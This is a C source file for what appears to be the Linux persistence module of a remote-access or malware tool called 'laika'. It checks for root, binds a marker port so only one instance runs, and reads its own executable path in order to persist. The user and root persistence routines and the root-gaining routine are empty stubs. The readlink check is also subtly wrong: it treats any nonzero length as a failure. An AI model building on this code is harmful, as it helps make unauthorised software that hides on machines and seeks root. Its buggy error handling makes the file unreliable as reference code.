/* platform specific code for achieving persistence on linux */

/* this is only used to check if another instance of laika is currently running */
#define LAIKA_RESERVED_PORT 32876

#include "persist.h"
#include "lsocket.h"
#include "lerror.h"

#include <unistd.h>
#include <sys/types.h>

static struct sLaika_socket laikaB_markerPort;

/* check if laika is already running */
bool laikaB_checkRunning() {
    return true; /* stubbed for now */
}

/* check if laika is already installed on current machine */
bool laikaB_checkPersist() {
    return true; /* stubbed for now */
}

/* check if laika is running as super-user */
bool laikaB_checkRoot() {
    return geteuid() == 0; /* user id 0 is reserved for root in 99% of the cases */
}

/* mark that laika is currently running */
void laikaB_markRunning() {
#ifndef DEBUG
    LAIKA_TRY
        laikaS_initSocket(&laikaB_markerPort, NULL, NULL, NULL, NULL);
        laikaS_bind(&laikaB_markerPort, LAIKA_RESERVED_PORT);
    LAIKA_CATCH
        LAIKA_DEBUG("Failed to bind marker port, laika is already running!\n");
        exit(0);
    LAIKA_TRYEND
#endif
}

/* unmark that laika is currently running */
void laikaB_unmarkRunning() {
#ifndef DEBUG
    laikaS_kill(&laikaB_markerPort);
#endif
}

void getCurrentExe(char *outPath, int pathSz) {
    int sz;

    /* thanks linux :D */
    if ((sz = readlink("/proc/self/exe", outPath, pathSz - 1)) != 0)
        LAIKA_ERROR("Failed to grab current process executable path!\n");

    outPath[sz] = '\0';
}

void tryPersistUser(char *path) {

}

void tryPersistRoot(char *path) {

}

/* try to gain persistance on machine */
void laikaB_tryPersist() {
    char exePath[PATH_MAX];

    /* grab current process's executable & try to gain persistance */
    getCurrentExe(exePath, PATH_MAX);
    if (laikaB_checkRoot()) {
        tryPersistRoot(exePath);
    } else {
        tryPersistUser(exePath);
    }
}

/* try to gain root */
void laikaB_tryRoot() {
    /* stubbed */
}